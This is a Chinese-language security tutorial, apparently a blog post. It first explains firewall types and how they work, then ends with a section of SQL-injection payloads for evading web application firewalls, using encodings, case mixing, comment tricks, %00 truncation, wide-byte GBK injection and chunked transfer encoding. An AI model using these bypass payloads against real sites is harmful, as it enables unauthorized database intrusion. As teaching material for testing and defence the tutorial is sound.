## 防火墙介绍

防火墙是一种安全系统，它基于一组安全规则来监视和控制网络流量。防火墙通常位于受信任的网络和不受信任的网络之间；通常，不受信任的网络是互联网。例如，办公室网络通常使用防火墙来保护其网络免受在线威胁。

防火墙决定是否允许传入和传出的流量通过。它们可以内置于硬件、软件或两者的组合之中。“防火墙”一词的来源是建筑中的一种做法，即在建筑物之间或建筑物的中间建起一道防护墙以做防火之用。与此相似，网络防火墙用于控制在线威胁。

## 防火墙分类

### 基于代理的防火墙

这些代理防火墙位于客户端和服务器之间。客户端连接到防火墙，防火墙检查传出的数据包，之后它将创建与目标收件人（网页服务器）的连接。同样，当网页服务器尝试向客户端发送响应时，防火墙将拦截该请求，检查数据包，然后在防火墙与客户端之间的单独连接中传递该响应。基于代理的防火墙有效地防止了客户端和服务器之间的直接连接。

### 状态防火墙

在计算机科学中，“有状态”的应用程序表示那些从先前事件和交互中保存了数据的应用程序。有状态的防火墙会保存关于公开连接的信息，并使用此信息来分析传入和传出的流量，而不是检查每个数据包。由于状态防火墙不会检查每个数据包，它们比基于代理的防火墙要快。

### 下一代防火墙(NGFW)

NGFW 不仅具有传统防火墙的功能，还部署了主机附加功能来解决对 OSI 模型其它层造成的威胁。NGFW 的部分特定功能包括：

- **深度数据包检测 (DPI)** – 与传统防火墙相比，NGFW 会对数据包执行更深入的检查。深度检查可以查看数据包有效负载以及数据包正在访问哪个应用程序。这让防火墙能够执行更精细的过滤规则。
- **应用程序感知** – 启用此功能能让防火墙知晓正在运行的应用程序和这些应用程序正在使用的端口。这可以防止那些意图中断正在运行的进程然后接管其端口的某些恶意软件类型。
- **身份识别** – 它使防火墙可以基于身份实施规则，例如正在使用的计算机、登录的用户等。
- **沙箱** – 防火墙可以隔离与传入数据包相关联的代码段，并在“沙盒”环境中执行它们，以确保它们没有恶意行为。然后，将此沙盒测试的结果作为决定是否让数据包进入网络的标准。

### Web应用程序防火墙(WAF)

传统防火墙有助于保护专用网络免受恶意 Web 应用程序的侵害，而 WAF 可帮助保护 Web 应用程序不受恶意用户的侵害。WAF 通过过滤和监控 Web 应用程序与互联网之间的 HTTP 流量来帮助保护 Web 应用程序。它通常可以保护 Web 应用程序，使其免受跨站点伪造、跨站点脚本 (XSS)、文件包含、SQL 注入及其他一些攻击的影响。

### 防火墙即服务(FWaas)

防火墙即服务 (FWaaS) 是一种较新的模式，通过云提供防火墙功能。这种服务也可称为“云防火墙”。FWaaS 在云平台、基础设施和应用程序周围形成一个虚拟屏障，就像传统防火墙在组织的内部网络周围形成一个屏障一样。FWaaS 通常比传统防火墙更适合保护云和多云资产。

## 防火墙原理

### 包过滤

包过滤是在IP层实现的，因此，它可以只用路由器完成。包过滤根据包的源IP地址、目的IP地址、源端口、目的端口及包传递方向等报头信息来判断是否允许包通过。过滤用户定义的内容，如IP地址。其工作原理是系统在网络层检查数据包，与应用层无关，包过滤器的应用非常广泛，因为CPU用来处理包过滤的时间可以忽略不计。而且这种防护措施对用户透明，合法用户在进出网络时，根本感觉不到它的存在，使用起来很方便。这样系统就具有很好的传输性能，易扩展。

### 状态监测

状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝。这种技术提供了高度安全的解决方案，同时具有较好的适应性和扩展性。状态检测防火墙一般也包括一些代理级的服务，它们提供附加的对特定应用程序数据内容的支持。状态检测技术最适合提供对UDP协议的有限支持。它将所有通过防火墙的UDP分组均视为一个虚连接，当反向应答分组送达时，就认为一个虚拟连接已经建立。

### 应用代理

工作在应用层，通过编写不同的应用代理程序，实现对应用层数据的检测和分析。应用代理防火墙超越状态监测防火墙在于它们并不允许任何包直接通过保护的系统。相反，防火墙在目的网络创建一个代理连接，通过这个代理连接传递通信。代理防火墙通常包含高级应用检测能力，允许防火墙检测尖端的应用层攻击，比如缓冲区溢出攻击和SQL注入攻击。应用代理防火墙通常比状态监测防火墙贵很多，因而，它们通常仅仅用来保护数据中心、包含公开访问的网络和高价值的服务器。


## 绕WAF

### 编码绕过

#### 1.URL编码

`1%27%20and%201%20%3D%201%20--%20`

#### 2.Base64编码

`JTMxJyUyMCU2MW4lNjQlMjAlMzElMjAlM2QlMjAlMzElMjAlMmQlMmQlMjA=`

#### 3.Hex编码

`%31'%20%61n%64%20%31%20%3d%20%31%20%2d%2d%20`

#### 4.ASCII编码

`\u0031\u0027\u0020\u0061\u006e\u0064\u0020\u0031\u0020\u003d\u0020\u0031\u0020\u002d\u002d\u0020`

### 大小写绕过

union select 
UniOn SEleCt

### 空格绕过

`1' and '1'='1 --
1'%0aand%0a'1'1='1%0a--
1'+and+'1'='1+--
1’/\*\*/and/\*\*/'1'='1/\*\*--'`

### 双写绕过

`1' and '1'='1 --
1' andAnd '1'='1 --'`

### 内联注释绕过

在MySQL里，/\*\*/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/\*后头加了惊叹号（/\*!50001sleep(3)\*/），那么此注释里的语句将被执行。

`?id=1+and+/*!50001sleep(3)*/+and+1=1`

### 请求方式绕过

https://blog.csdn.net/weixin_42220532/article/details/104411061

### 超大数据绕过

部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测

### 复参数绕过

`?id=1&id=1'and 1=1 --`

### 截断绕过

部分WAF在解析参数的时候当遇到%00时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。

`?id=%00.1' and 1=1 --`

### 宽字节绕过

宽字节注入是因为使用了GBK编码。为了防止sql注入，提交的单引号(%27)会进行转义处理，即在单引号前加上斜杠(%5C%27)。

`?id=1%df%27and 1=1--+`

%df%27经过转义后会变成%df%5C%27,%df%5c会被识别为一个新的字节，而%27则被当做单引号，成功实现了语句闭合。

### 分块绕过

分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。

```

原始请求数据：
id=1 and 1=1 -- &submit=%E6%9F%A5%E8%AF%A2

分块传输数据：
Transfer-Encoding:chunked
4
id=1
5
 and 
3
1=1
4
 -- 
8
&submit=
9
%E6%9F%A5
9
%E8%AF%A2
0
（两个换行）

```
